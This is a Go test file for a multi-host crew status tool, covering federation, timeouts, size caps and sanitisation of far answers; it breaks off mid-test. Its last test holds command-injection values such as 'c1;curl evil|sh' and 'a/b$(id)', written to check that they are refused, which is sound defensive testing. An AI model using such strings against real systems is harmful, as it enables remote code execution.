package fleet

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"maps"
	"os"
	"path/filepath"
	"reflect"
	"regexp"
	"slices"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/noamsto/dispatcher/crew/internal/jsonval"
	"github.com/noamsto/dispatcher/crew/internal/lane"
	"github.com/noamsto/dispatcher/crew/internal/peer"
	"github.com/noamsto/dispatcher/crew/internal/proc/proctest"
	"github.com/noamsto/dispatcher/crew/internal/remote"
	"github.com/noamsto/dispatcher/crew/internal/roster"
	"github.com/noamsto/dispatcher/crew/internal/sender"
	"github.com/noamsto/dispatcher/crew/internal/tmux/tmuxtest"
)

const stampFormat = "list-windows -a -F #{@crew_id}\x1f#{@crew_dispatcher_host}"

// overseer makes f the overseer session of self: CREW_OVERSEER set, a passing
// sender check for overseer:<self>, and settings hosts self plus partners.
func (f *statusFix) overseer(self string, partners ...string) {
	f.env["CREW_OVERSEER"] = self
	f.opts.Host = func() (string, error) { return self, nil }
	f.opts.Sender = sender.Probes{
		Getenv: f.opts.Getenv,
		Tmux:   &tmuxtest.Fake{Out: map[string]string{"list-panes": ""}},
		Proc:   proctest.New(nil, map[int]int{os.Getpid(): 1}),
		Self:   func() (string, error) { return self, nil },
		Hosts: func() (map[string]remote.Host, error) {
			hosts := map[string]remote.Host{self: {}}
			for _, p := range partners {
				hosts[p] = remote.Host{}
			}
			return hosts, nil
		},
	}
	f.opts.FederateTimeout = 5 * time.Second
}

func (f *statusFix) hostDir(host string) string {
	return lane.OverseerHostDir(f.env["XDG_STATE_HOME"], host)
}

// farFix is a second fleet, the partner `host`, with its own registry, state
// and buses.
func farFix(t *testing.T, host string, lines ...string) *statusFix {
	t.Helper()
	far := newStatusFix(t, lines...)
	far.opts.Host = func() (string, error) { return host, nil }
	return far
}

// fedCalls records every Federate call; Federate runs on goroutines.
type fedCalls struct {
	mu    sync.Mutex
	calls []string
}

func (c *fedCalls) add(host string, argv []string) {
	c.mu.Lock()
	defer c.mu.Unlock()
	c.calls = append(c.calls, host+": "+strings.Join(argv, " "))
}

func (c *fedCalls) list() []string {
	c.mu.Lock()
	defer c.mu.Unlock()
	return slices.Clone(c.calls)
}

// serve answers a pull the way the far `crew overseer status` does: ServeFar
// over the far fleet, encoded as one JSON object.
func (c *fedCalls) serve(t *testing.T, far *statusFix) roster.Capture {
	return func(ctx context.Context, host string, argv []string, stdout, stderr io.Writer) int {
		c.add(host, argv)
		if len(argv) != 7 {
			t.Errorf("argv = %q", argv)
			return 2
		}
		since, err := strconv.ParseInt(argv[6], 10, 64)
		if err != nil {
			t.Errorf("--since %q: %v", argv[6], err)
			return 2
		}
		ans, err := ServeFar(ctx, argv[4], since, stderr, far.opts)
		if err != nil {
			_, _ = fmt.Fprintln(stderr, err)
			return 1
		}
		if err := jsonval.Encode(stdout, ans, false); err != nil {
			t.Error(err)
			return 1
		}
		return 0
	}
}

// answering writes text as the far answer of every pull.
func answering(text string) roster.Capture {
	return func(_ context.Context, _ string, _ []string, stdout, _ io.Writer) int {
		_, _ = io.WriteString(stdout, text)
		return 0
	}
}

func nowMS() int64 { return fixedNow.UnixMilli() }

func TestFederateTwoHostsUp(t *testing.T) {
	far := farFix(t, "mbp",
		wstatus(100, "c9", "feat/z", "working", ""),
		wmsg(50, "c9", "dispatcher:c9", "overseer:halo", `"{\"kind\":\"ack\",\"re\":7}"`),
		wmsg(40, "c9", "worker:feat/z#s1-1", "overseer:halo", `{"kind":"ack"}`),
	)
	far.windows("feat/z")
	f := newStatusFix(t, wstatus(100, "c1", "feat/a", "working", ""))
	f.overseer("halo", "mbp")
	var calls fedCalls
	f.opts.Federate = calls.serve(t, far)

	doc := f.collect(StatusRequest{})
	if len(doc.Repos) != 1 || doc.Repos[0].Host != "halo" {
		t.Fatalf("local repos = %+v, want one tagged halo", doc.Repos)
	}
	if len(doc.Hosts) != 1 {
		t.Fatalf("hosts = %+v, want mbp", doc.Hosts)
	}
	h := doc.Hosts[0]
	if h.Host != "mbp" || h.State != "ok" || h.Error != nil {
		t.Fatalf("host = %+v %v, want mbp ok", h, h.Error)
	}
	if h.TS == nil || *h.TS != nowMS() || h.LastOkTS == nil || *h.LastOkTS != nowMS() || h.AgeS == nil || *h.AgeS != 0 {
		t.Errorf("ts/last_ok_ts/age_s = %v/%v/%v", h.TS, h.LastOkTS, h.AgeS)
	}
	if len(h.Repos) != 1 || h.Repos[0].Host != "mbp" || h.Repos[0].Repo != "acme/alpha" {
		t.Fatalf("far repos = %+v", h.Repos)
	}
	c9 := h.Repos[0].Crews[0]
	if c9.CrewID != "c9" || len(c9.OverseerInbox) != 1 || c9.OverseerInbox[0].TS != ago(50) {
		t.Errorf("far crew = %+v, want c9 with the dispatcher's ack in its inbox", c9)
	}
	if h.Machine == nil {
		t.Error("an ok host carries its machine document")
	}
	b := h.Batches()
	if len(b) != 1 || b[0].Repo != "acme/alpha" || b[0].Common != far.common || b[0].Cursor != ago(40) || len(b[0].Events) != 1 || b[0].Events[0]["from"] != "dispatcher:c9" {
		t.Errorf("batches = %+v", b)
	}
	if m := h.Misroutes(); len(m) != 1 || m[0] != (FarMisrouted{Repo: "acme/alpha", Common: far.common, CrewID: "c9", From: "worker:feat/z#s1-1", TS: ago(40)}) {
		t.Errorf("misroutes = %+v", m)
	}
	if ts, ok := ReadOK(f.hostDir("mbp")); !ok || ts != nowMS() {
		t.Errorf("ok file = %d %v, want %d", ts, ok, nowMS())
	}
	raw, err := json.Marshal(doc)
	if err != nil {
		t.Fatal(err)
	}
	if bytes.Contains(raw, []byte(`"overseer:halo"`)) {
		t.Errorf("the admitted events must not be in the document: %s", raw)
	}
}

func TestFederateUnreachable(t *testing.T) {
	failing := func(_ context.Context, _ string, _ []string, _, stderr io.Writer) int {
		_, _ = io.WriteString(stderr, "ssh: connect to host mbp: \x1b[31mrefused\x7f\nsecond line\n")
		return 255
	}
	t.Run("with an ok file", func(t *testing.T) {
		f := newStatusFix(t, wstatus(100, "c1", "feat/a", "working", ""))
		f.overseer("halo", "mbp")
		if err := WriteOK(f.hostDir("mbp"), ago(3600)); err != nil {
			t.Fatal(err)
		}
		f.opts.Federate = failing
		doc := f.collect(StatusRequest{})
		h := doc.Hosts[0]
		if h.State != "unreachable" || h.Error == nil || *h.Error != "ssh: connect to host mbp: [31mrefused" {
			t.Errorf("host = %+v error %v", h, h.Error)
		}
		if h.LastOkTS == nil || *h.LastOkTS != ago(3600) || h.AgeS == nil || *h.AgeS != 3600 {
			t.Errorf("last_ok_ts/age_s = %v/%v, want %d/3600", h.LastOkTS, h.AgeS, ago(3600))
		}
		if h.TS != nil || len(h.Repos) != 0 || h.Machine != nil || h.Batches() != nil {
			t.Errorf("an unreachable host carries no far data: %+v", h)
		}
		if ts, _ := ReadOK(f.hostDir("mbp")); ts != ago(3600) {
			t.Errorf("a failed pull wrote the ok file: %d", ts)
		}
		if len(doc.Repos) != 1 {
			t.Errorf("local repos = %+v", doc.Repos)
		}
	})
	t.Run("no ok file", func(t *testing.T) {
		f := newStatusFix(t)
		f.overseer("halo", "mbp")
		f.opts.Federate = failing
		h := f.collect(StatusRequest{}).Hosts[0]
		if h.State != "unreachable" || h.LastOkTS != nil || h.AgeS != nil {
			t.Errorf("host = %+v, want unreachable with null last_ok_ts and age_s", h)
		}
		raw, _ := json.Marshal(h)
		if !strings.Contains(string(raw), `"last_ok_ts":null,"age_s":null`) {
			t.Errorf("json = %s", raw)
		}
	})
}

func TestFederateTimeout(t *testing.T) {
	f := newStatusFix(t, wstatus(100, "c1", "feat/a", "working", ""))
	f.overseer("halo", "mbp")
	f.opts.FederateTimeout = 50 * time.Millisecond
	f.opts.Federate = func(ctx context.Context, _ string, _ []string, stdout, _ io.Writer) int {
		select {
		case <-ctx.Done():
			return 255
		case <-time.After(10 * time.Second):
			_, _ = io.WriteString(stdout, "{}")
			return 0
		}
	}
	start := time.Now()
	doc := f.collect(StatusRequest{})
	if el := time.Since(start); el > 5*time.Second {
		t.Errorf("collect took %s, past the federate timeout", el)
	}
	h := doc.Hosts[0]
	if h.State != "unreachable" || h.Error == nil || !strings.Contains(*h.Error, "no answer within 50ms") {
		t.Errorf("host = %+v error %v", h, h.Error)
	}
	if len(doc.Repos) != 1 || doc.crew(t, "c1").CrewID != "c1" {
		t.Errorf("local repos = %+v", doc.Repos)
	}
}

func TestFederateOverSizeAnswer(t *testing.T) {
	f := newStatusFix(t)
	f.overseer("halo", "mbp")
	var accepted int
	f.opts.Federate = func(_ context.Context, _ string, _ []string, stdout, _ io.Writer) int {
		chunk := bytes.Repeat([]byte(" "), 64<<10)
		for range 80 { // 5 MiB
			n, err := stdout.Write(chunk)
			accepted += n
			if err != nil {
				break
			}
		}
		return 0
	}
	h := f.collect(StatusRequest{}).Hosts[0]
	if accepted > farMaxBytes {
		t.Errorf("the capped writer accepted %d bytes, over %d", accepted, farMaxBytes)
	}
	if h.State != "unreachable" || h.Error == nil || *h.Error != "answer over 4 MiB" {
		t.Errorf("host = %+v error %v", h, h.Error)
	}
}

func TestFederateSelfNameMismatch(t *testing.T) {
	far := farFix(t, "mbp.local")
	f := newStatusFix(t)
	f.overseer("halo", "mbp")
	var calls fedCalls
	f.opts.Federate = calls.serve(t, far)
	h := f.collect(StatusRequest{}).Hosts[0]
	want := "far self-name mbp.local ≠ settings key mbp: its overseer's msgs are refused here"
	if h.State != "ok" || h.Error == nil || *h.Error != want {
		t.Errorf("host = %+v error %v, want ok with %q", h, h.Error, want)
	}
}

func TestFederateGateFailing(t *testing.T) {
	f := newStatusFix(t)
	f.overseer("halo", "zed", "mbp")
	f.opts.Sender.Tmux = nil
	var calls fedCalls
	f.opts.Federate = func(_ context.Context, host string, argv []string, _, _ io.Writer) int {
		calls.add(host, argv)
		return 0
	}
	doc := f.collect(StatusRequest{})
	if got := calls.list(); len(got) != 0 {
		t.Errorf("a failing sender check federated: %q", got)
	}
	if len(doc.Hosts) != 2 || doc.Hosts[0].Host != "mbp" || doc.Hosts[1].Host != "zed" {
		t.Fatalf("hosts = %+v, want mbp and zed in order", doc.Hosts)
	}
	for _, h := range doc.Hosts {
		if h.State != "unprobed" || h.Error == nil || !strings.Contains(*h.Error, "pane stamps cannot be read") {
			t.Errorf("host = %+v error %v, want unprobed with the sender reason", h, h.Error)
		}
	}
}

func TestFederateNeedsOverseerAndFederate(t *testing.T) {
	far := farFix(t, "mbp")
	f := newStatusFix(t)
	f.overseer("halo", "mbp")
	var calls fedCalls
	f.opts.Federate = calls.serve(t, far)
	f.env["CREW_OVERSEER"] = ""
	if doc := f.collect(StatusRequest{}); len(doc.Hosts) != 0 || len(calls.list()) != 0 {
		t.Errorf("outside overseer mode: hosts=%+v calls=%q", doc.Hosts, calls.list())
	}
	f.env["CREW_OVERSEER"] = "halo"
	f.opts.Served = &ServedStatus{Origin: "zed"}
	if doc := f.collect(StatusRequest{}); len(doc.Hosts) != 0 || len(calls.list()) != 0 {
		t.Errorf("served mode federated: hosts=%+v calls=%q", doc.Hosts, calls.list())
	}
	f.opts.Served = nil
	f.opts.Sender.Hosts = nil
	var stderr bytes.Buffer
	doc := CollectStatus(t.Context(), StatusRequest{}, &stderr, f.opts)
	if len(doc.Hosts) != 0 || len(calls.list()) != 0 || !strings.Contains(stderr.String(), "hosts") {
		t.Errorf("unreadable hosts: hosts=%+v calls=%q stderr=%q", doc.Hosts, calls.list(), stderr.String())
	}
}

// farAnswer is a valid answer from mbp, for halo, whose one batch holds events.
func farAnswer(events ...map[string]any) map[string]any {
	worker := map[string]any{"branch": "feat/z", "state": "working", "title": "fine", "stale": false}
	crew := map[string]any{
		"crew_id": "c9", "attention": "attended", "workers": []any{worker}, "holds": []any{}, "overseer_inbox": []any{},
		"dispatcher": map[string]any{"state": "live", "pid": 100, "pane": nil, "lane": nil, "last_event_s": 5, "home": nil},
	}
	repo := map[string]any{"host": "mbp", "repo": "acme/alpha", "common": "/git/alpha/.git", "misrouted": 0, "crews": []any{crew}}
	evs := make([]any, len(events))
	for i, e := range events {
		evs[i] = e
	}
	return map[string]any{
		"v": 1, "self": "mbp", "ts": nowMS(), "cursor": ago(10),
		"status": map[string]any{
			"ts": nowMS(), "host": "mbp", "machine": nil,
			"queue": map[string]any{"head": nil, "demoted": []any{}, "parked": []any{}},
			"repos": []any{repo}, "skipped": []any{}, "hosts": []any{},
		},
		"inbox":     []any{map[string]any{"repo": "acme/alpha", "cursor": ago(10), "events": evs}},
		"misrouted": []any{},
	}
}

func farEvent(ts any, crew, from, to string, body any) map[string]any {
	return map[string]any{"ts": ts, "crew_id": crew, "kind": "msg", "from": from, "to": to, "body": body}
}

func marshal(t *testing.T, v any) []byte {
	t.Helper()
	raw, err := json.Marshal(v)
	if err != nil {
		t.Fatal(err)
	}
	return raw
}

func TestAdmitHostRefusals(t *testing.T) {
	valid := marshal(t, farAnswer())
	if _, err := AdmitHost(valid, "mbp", "halo", 0); err != nil {
		t.Fatalf("a valid answer is refused: %v", err)
	}
	with := func(edit func(a map[string]any)) []byte {
		a := farAnswer()
		edit(a)
		return marshal(t, a)
	}
	repos := func(a map[string]any) []any { return a["status"].(map[string]any)["repos"].([]any) }
	crewOf := func(a map[string]any) map[string]any {
		return repos(a)[0].(map[string]any)["crews"].([]any)[0].(map[string]any)
	}
	for _, tc := range []struct {
		name, want string
		in         []byte
	}{
		{"empty", "not JSON", nil},
		{"two values", "more than one JSON value", append(append(slices.Clone(valid), '\n'), valid...)},
		{"an array", "not a JSON object", []byte(`[1]`)},
		{"over 4 MiB", "answer over 4 MiB", append(slices.Clone(valid), bytes.Repeat([]byte(" "), farMaxBytes)...)},
		{"v 2", "version", with(func(a map[string]any) { a["v"] = 2 })},
		{"v missing", "version", with(func(a map[string]any) { delete(a, "v") })},
		{"ts not whole", "ts", with(func(a map[string]any) { a["ts"] = 1.5 })},
		{"ts a string", "ts", with(func(a map[string]any) { a["ts"] = "1700000100000" })},
		{"status not an object", "status", with(func(a map[string]any) { a["status"] = "x" })},
		{"repos cap", "200 repos", with(func(a map[string]any) {
			r := repos(a)[0]
			a["status"].(map[string]any)["repos"] = slices.Repeat([]any{r}, 201)
		})},
		{"crews cap", "100 crews", with(func(a map[string]any) {
			r := repos(a)[0].(map[string]any)
			r["crews"] = slices.Repeat(r["crews"].([]any), 101)
		})},
		{"workers cap", "200 workers", with(func(a map[string]any) {
			c := crewOf(a)
			c["workers"] = slices.Repeat(c["workers"].([]any), 201)
		})},
		{"events cap", "500 inbox events", with(func(a map[string]any) {
			ev := farEvent(ago(5), "c9", "dispatcher:c9", "overseer:halo", "{}")
			a["inbox"] = []any{
				map[string]any{"repo": "a", "cursor": 1, "events": slices.Repeat([]any{ev}, 300)},
				map[string]any{"repo": "b", "cursor": 1, "events": slices.Repeat([]any{ev}, 201)},
			}
		})},
	} {
		t.Run(tc.name, func(t *testing.T) {
			_, err := AdmitHost(tc.in, "mbp", "halo", 0)
			if err == nil || !strings.Contains(err.Error(), tc.want) {
				t.Errorf("err = %v, want one naming %q", err, tc.want)
			}
		})
	}
}

func TestAdmitHostRechecksEvents(t *testing.T) {
	cutoff := ago(1000)
	good := farEvent(ago(30), "c9", "dispatcher:c9", "overseer:halo", `{"kind":"ack","re":7}`)
	status := farEvent(ago(29), "c9", "dispatcher:c9", "overseer:halo", "{}")
	status["kind"] = "status"
	raw := marshal(t, farAnswer(
		good,
		farEvent(ago(28), "c9", "dispatcher:c9", "overseer:box", "{}"),
		farEvent(ago(27), "c9", "worker:feat/z#s1-1\x1b", "overseer:halo", "{}"),
		farEvent(ago(26), "", "dispatcher:", "overseer:halo", "{}"),
		farEvent(json.Number("1700000074000.5"), "c9", "dispatcher:c9", "overseer:halo", "{}"),
		farEvent(ago(2000), "c9", "dispatcher:c9", "overseer:halo", "{}"),
		farEvent(ago(25), "c9", "dispatcher:c9", "overseer:halo", strings.Repeat("b", peer.MaxBody+1)),
		farEvent(ago(24), "c9", "dispatcher:c9", "overseer:halo", map[string]any{"kind": "note", "text": strings.Repeat("b", peer.MaxBody)}),
		status,
	))
	ans, err := AdmitHost(raw, "mbp", "halo", cutoff)
	if err != nil {
		t.Fatal(err)
	}
	if len(ans.Inbox) != 1 || len(ans.Inbox[0].Events) != 1 || ans.Inbox[0].Events[0]["ts"] != json.Number(strconv.FormatInt(ago(30), 10)) {
		t.Fatalf("inbox = %+v, want only the dispatcher's ack", ans.Inbox)
	}
	// The msg from worker:feat/z#s1-1\x1b names no valid sender: dropped.
	want := []FarMisrouted{
		{Repo: "acme/alpha", CrewID: "c9", From: "dispatcher:c9", TS: ago(28)},
		{Repo: "acme/alpha", CrewID: "", From: "dispatcher:", TS: ago(26)},
		{Repo: "acme/alpha", CrewID: "c9", From: "dispatcher:c9", TS: 0},
		{Repo: "acme/alpha", CrewID: "c9", From: "dispatcher:c9", TS: ago(2000)},
		{Repo: "acme/alpha", CrewID: "c9", From: "dispatcher:c9", TS: ago(25)},
		{Repo: "acme/alpha", CrewID: "c9", From: "dispatcher:c9", TS: ago(24)},
		{Repo: "acme/alpha", CrewID: "c9", From: "dispatcher:c9", TS: ago(29)},
	}
	if !slices.Equal(ans.Misrouted, want) {
		t.Errorf("misrouted =\n%+v\nwant\n%+v", ans.Misrouted, want)
	}
}

func TestAdmitHostSanitizes(t *testing.T) {
	a := farAnswer(farEvent(ago(30), "c9", "dispatcher:c9", "overseer:halo", "{\"kind\":\"ack\",\"text\":\"hi\u200b\x01\"}"))
	status := a["status"].(map[string]any)
	repo := status["repos"].([]any)[0].(map[string]any)
	repo["host"] = "evil"
	bad := maps.Clone(repo)
	bad["common"], bad["repo"] = "/git/beta/.git", "acme/\x1b[2Jbeta\u200b"
	status["repos"] = append(status["repos"].([]any), bad)
	status["skipped"] = []any{map[string]any{"path": "/git/gamma/.git", "status": strings.Repeat("é", peer.MaxBody) + "\x1b"}}
	worker := repo["crews"].([]any)[0].(map[string]any)["workers"].([]any)[0].(map[string]any)
	worker["na\u202eme"] = "otter"
	worker["name"] = "ot\x07ter\u0085"
	a["misrouted"] = []any{
		map[string]any{"repo": "acme/alpha", "crew_id": "c9\u2066", "from": "worker:xy", "ts": ago(40)},
		map[string]any{"repo": "acme/alpha", "crew_id": "c9", "from": "worker:x\x00y", "ts": ago(39)},
		map[string]any{"repo": "acme/alpha", "crew_id": "c9", "from": "worker:xy", "ts": ago(38)},
	}
	a["self"] = "mbp\x1b"

	ans, err := AdmitHost(marshal(t, a), "mbp", "halo", 0)
	if err != nil {
		t.Fatal(err)
	}
	if len(ans.Status.Repos) != 1 {
		t.Fatalf("repos = %+v, want beta's label dropped", ans.Status.Repos)
	}
	r := ans.Status.Repos[0]
	if r.Host != "mbp" || r.Repo != "acme/alpha" {
		t.Errorf("repo host/label = %q/%q", r.Host, r.Repo)
	}
	w := r.Crews[0].Workers[0]
	if _, has := w["name"]; has || w["branch"] != "feat/z" {
		t.Errorf("worker = %v, want its invalid name dropped and the invisible-laced key unread", w)
	}
	sk := ans.Status.Skipped
	if len(sk) != 2 || sk[1] != (Skipped{Path: "/git/beta/.git", Status: "invalid repo label"}) {
		t.Fatalf("skipped = %+v, want gamma's and beta's", sk)
	}
	if s := sk[0].Status; len(s) > peer.MaxBody || !utf8.ValidString(s) || s == "" || strings.ContainsRune(s, '\x1b') {
		t.Errorf("skipped status is %d bytes, valid=%v; want scrubbed and capped at %d rune-safe", len(s), utf8.ValidString(s), peer.MaxBody)
	}
	if body := ans.Inbox[0].Events[0]["body"]; body != `{"kind":"ack","text":"hi"}` {
		t.Errorf("body = %q", body)
	}
	if m := ans.Misrouted; len(m) != 1 || m[0].TS != ago(38) {
		t.Errorf("misrouted = %+v, want only the valid one", m)
	}
	if ans.Self != "" {
		t.Errorf("self = %q, want an invalid self-name dropped", ans.Self)
	}
}

func TestCappedWriter(t *testing.T) {
	w := &cappedWriter{max: 10}
	if n, err := w.Write([]byte("12345678")); n != 8 || err != nil {
		t.Fatalf("write = %d %v", n, err)
	}
	if n, err := w.Write([]byte("abcd")); n != 2 || err == nil {
		t.Errorf("write past the cap = %d %v, want 2 and an error", n, err)
	}
	if n, _ := w.Write([]byte("z")); n != 0 || w.buf.String() != "12345678ab" || !w.over {
		t.Errorf("buf = %q over=%v", w.buf.String(), w.over)
	}
}

func TestServeFar(t *testing.T) {
	far := farFix(t, "mbp",
		wstatus(500, "c9", "feat/z", "working", ""),
		wmsg(300, "c9", "dispatcher:c9", "overseer:halo", `{"kind":"ack"}`),
		wmsg(200, "c9", "dispatcher:c9", "overseer:halo", `{"kind":"note"}`),
		wmsg(150, "c9", "dispatcher:c9", "overseer:mbp", `{"kind":"note"}`),
		wmsg(100, "c9", "worker:feat/z#s1-1", "overseer:halo", `{"kind":"ack"}`),
	)
	other := mkRepo(t, far.root, "beta", "", wmsg(250, "c4", "dispatcher:c4", "overseer:halo", `{"kind":"ack"}`))
	if err := os.WriteFile(far.opts.Registry, []byte(far.common+"\n"+other+"\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	ans, err := ServeFar(t.Context(), "halo", ago(250), io.Discard, far.opts)
	if err != nil {
		t.Fatal(err)
	}
	if ans.V != 1 || ans.Self != "mbp" || ans.TS != nowMS() {
		t.Errorf("v/self/ts = %d/%q/%d", ans.V, ans.Self, ans.TS)
	}
	if len(ans.Status.Repos) != 2 || len(ans.Status.Hosts) != 0 {
		t.Fatalf("status repos = %+v hosts = %+v", ans.Status.Repos, ans.Status.Hosts)
	}
	if len(ans.Inbox) != 1 || ans.Inbox[0].Repo != "acme/alpha" || ans.Inbox[0].Cursor != ago(100) || len(ans.Inbox[0].Events) != 1 {
		t.Errorf("inbox = %+v, want alpha's note above since (beta's ack is at since)", ans.Inbox)
	}
	if want := []FarMisrouted{{Repo: "acme/alpha", Common: far.common, CrewID: "c9", From: "worker:feat/z#s1-1", TS: ago(100)}}; !slices.Equal(ans.Misrouted, want) {
		t.Errorf("misrouted = %+v", ans.Misrouted)
	}
	if ans.Cursor != ago(100) {
		t.Errorf("cursor = %d, want %d", ans.Cursor, ago(100))
	}

	quiet, err := ServeFar(t.Context(), "halo", ago(50), io.Discard, far.opts)
	if err != nil {
		t.Fatal(err)
	}
	if quiet.Cursor != ago(50) || quiet.Inbox == nil || len(quiet.Inbox) != 0 || quiet.Misrouted == nil {
		t.Errorf("nothing above since: %+v", quiet)
	}
}

func TestOverseerProbe(t *testing.T) {
	remoteRow := func(s int64, crew, branch, host string) string {
		return fmt.Sprintf(`{"ts":%d,"crew_id":%q,"kind":"dispatch","branch":%q,"name":"remy","host":%q,"remote":true}`, ago(s), crew, branch, host)
	}
	f := newStatusFix(t,
		remoteRow(60, "c1", "r/1", "h1"),
		remoteRow(60, "c2", "r/2", "h1"),
		remoteRow(60, "c3", "r/3", "h2"),
		remoteRow(60, "c4", "r/4", "h3"),
	)
	beta := mkRepo(t, f.root, "beta", "", remoteRow(60, "c5", "r/5", "h2"))
	if err := os.WriteFile(f.opts.Registry, []byte(f.common+"\n"+beta+"\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	f.overseer("halo")
	f.opts.FederateTimeout = 100 * time.Millisecond
	var calls fedCalls
	var dirs []string
	f.opts.OverseerProbe = func(dir string) roster.Capture {
		dirs = append(dirs, dir)
		return func(ctx context.Context, host string, argv []string, stdout, stderr io.Writer) int {
			calls.add(host, argv)
			switch host {
			case "h2":
				_, _ = io.WriteString(stderr, "h2 is down\nmore\n")
				return 255
			case "h3":
				<-ctx.Done()
				return 255
			}
			crew := argv[len(argv)-1]
			_, _ = fmt.Fprintf(stdout, `[{"branch":"r/%s","state":"working","live":true,"age_s":5}]`, strings.TrimPrefix(crew, "c"))
			return 0
		}
	}
	start := time.Now()
	doc := f.collect(StatusRequest{})
	if el := time.Since(start); el > 10*time.Second {
		t.Errorf("collect took %s: the probe was not cut at FederateTimeout", el)
	}
	if want := []string{filepath.Dir(f.common), filepath.Dir(beta)}; !slices.Equal(dirs, want) {
		t.Errorf("OverseerProbe dirs = %q, want %q", dirs, want)
	}
	got := calls.list()
	slices.Sort(got)
	want := []string{
		"h1: crew roster --live -- c1",
		"h1: crew roster --live -- c2",
		"h2: crew roster --live -- c3",
		"h3: crew roster --live -- c4",
	}
	if !slices.Equal(got, want) {
		t.Errorf("calls = %q, want %q (beta's h2 probe fails fast)", got, want)
	}
	for _, crew := range []string{"c1", "c2"} {
		w := doc.crew(t, crew).Workers[0]
		if w["state"] != "working" || w["remote_unprobed"] != false || w["host"] != "h1" {
			t.Errorf("%s row = %v, want probed", crew, w)
		}
	}
	for _, crew := range []string{"c3", "c5"} {
		if w := doc.crew(t, crew).Workers[0]; w["host_error"] != "h2 is down" || w["remote_unprobed"] != false {
			t.Errorf("%s row = %v, want h2's first line", crew, w)
		}
	}
	if w := doc.crew(t, "c4").Workers[0]; w["host_error"] != "no answer within 100ms" {
		t.Errorf("c4 row = %v", w)
	}

	f.opts.Sender.Tmux = nil
	doc = f.collect(StatusRequest{})
	if got := calls.list(); len(got) != len(want) {
		t.Errorf("a failing sender check probed: %q", got[len(want):])
	}
	if w := doc.crew(t, "c1").Workers[0]; w["remote_unprobed"] != true {
		t.Errorf("row = %v, want the unprobed placeholder", w)
	}
}

func TestOverseerProbeRefusesOtherArgv(t *testing.T) {
	called := false
	m := &probeMemo{timeout: time.Second, failed: map[string]string{}}
	c := m.wrap(func(context.Context, string, []string, io.Writer, io.Writer) int {
		called = true
		return 0
	}, "c1")
	for _, argv := range [][]string{
		{"crew", "roster", "--live", "--", "c2"},
		{"crew", "roster", "--live", "c1"},
		{"crew", "msg", "dispatcher:c1", "x"},
		{"crew", "roster", "--live", "--", "c1", "extra"},
	} {
		var stderr bytes.Buffer
		if rc := c(t.Context(), "h1", argv, io.Discard, &stderr); rc != 1 || stderr.Len() == 0 {
			t.Errorf("%q: rc=%d stderr=%q, want a refusal", argv, rc, stderr.String())
		}
	}
	if called {
		t.Error("a refused argv reached the probe")
	}
}

func TestGuestCrews(t *testing.T) {
	f := newStatusFix(t,
		wstatus(100, "c9", "feat/z", "working", ""),
		wstatus(100, "c8", "feat/y", "done", ""),
		wstatus(100, "c7", "feat/x", "working", ""),
		wstatus(100, "c6", "feat/w", "working", ""),
	)
	f.opts.Host = func() (string, error) { return "mbp", nil }
	f.windows("feat/z", "feat/x", "feat/w")
	f.tmux.Out[stampFormat] = "c9\x1fhalo\nc7\x1fmbp\nc6\x1fhalo\n"
	f.pidfile("c6", "101")
	doc := f.collect(StatusRequest{})

	c9 := doc.crew(t, "c9")
	if c9.Attention != "guest" || c9.Dispatcher.Home == nil || *c9.Dispatcher.Home != "halo" {
		t.Errorf("c9 = %+v home %v, want guest of halo", c9, c9.Dispatcher.Home)
	}
	if c8 := doc.crew(t, "c8"); c8.Attention != "idle" || c8.Dispatcher.Home != nil {
		t.Errorf("c8 = %+v, want idle with no home", c8)
	}
	if c7 := doc.crew(t, "c7"); c7.Attention != "unattended" || c7.Dispatcher.Home != nil {
		t.Errorf("c7 (stamped with this host) = %+v, want unattended", c7)
	}
	if c6 := doc.crew(t, "c6"); c6.Attention != "unattended" || c6.Dispatcher.Home != nil {
		t.Errorf("c6 (a dead registration) = %+v, want unattended", c6)
	}
	raw := marshal(t, doc.crew(t, "c8").Dispatcher)
	if !strings.Contains(string(raw), `"home":null`) {
		t.Errorf("dispatcher json = %s", raw)
	}
}

// One owner per worker: the home crew on halo holds the --host worker as a
// remote row, mbp's guest crew holds its real status rows.
func TestFederateDedupFixture(t *testing.T) {
	far := farFix(t, "mbp",
		wstatus(400, "c1", "r/1", "blocked", `,"detail":"waiting (cycle 2 of 24)"`),
	)
	far.windows("r/1")
	far.tmux.Out[stampFormat] = "c1\x1fhalo\n"
	f := newStatusFix(t,
		fmt.Sprintf(`{"ts":%d,"crew_id":"c1","kind":"dispatch","branch":"r/1","name":"remy","host":"mbp","remote":true}`, ago(500)),
	)
	f.pidfile("c1", "100")
	f.overseer("halo", "mbp")
	var calls fedCalls
	f.opts.Federate = calls.serve(t, far)
	doc := f.collect(StatusRequest{})

	home := doc.crew(t, "c1")
	if home.Attention != "attended" || len(home.Workers) != 1 {
		t.Fatalf("home crew = %+v", home)
	}
	if w := home.Workers[0]; w["host"] != "mbp" || w["remote_unprobed"] != true || w["blocked"] != nil {
		t.Errorf("home row = %v, want mbp's placeholder with no worker-level state", w)
	}
	if doc.Repos[0].Host != "halo" {
		t.Errorf("home repo host = %q", doc.Repos[0].Host)
	}
	h := doc.Hosts[0]
	if h.State != "ok" || len(h.Repos) != 1 || h.Repos[0].Host != "mbp" {
		t.Fatalf("mbp = %+v", h)
	}
	guest := h.Repos[0].Crews[0]
	if guest.CrewID != "c1" || guest.Attention != "guest" || guest.Dispatcher.Home == nil || *guest.Dispatcher.Home != "halo" {
		t.Errorf("guest crew = %+v", guest)
	}
	if len(guest.Workers) != 1 {
		t.Fatalf("guest workers = %v", guest.Workers)
	}
	w := guest.Workers[0]
	if _, has := w["host"]; has || w["state"] != "blocked" || w["blocked"] == nil {
		t.Errorf("guest row = %v, want the local blocked row", w)
	}
}

// shellish are the characters no far identifier may carry into a status
// document or a lane line.
const shellish = "$(;` |"

func TestAdmitHostRestrictsFarIdentifiers(t *testing.T) {
	const evil = "c1;curl evil|sh"
	a := farAnswer(
		farEvent(ago(30), "c9", "dispatcher:c9", "overseer:halo", "{}"),
		farEvent(ago(29), evil, "dispatcher:"+evil, "overseer:halo", "{}"),
	)
	status := a["status"].(map[string]any)
	repo := status["repos"].([]any)[0].(map[string]any)
	bad := maps.Clone(repo)
	bad["repo"], bad["common"] = "a/b$(id)", "/git/a b;`x`/.git"
	status["repos"] = append(status["repos"].([]any), bad)
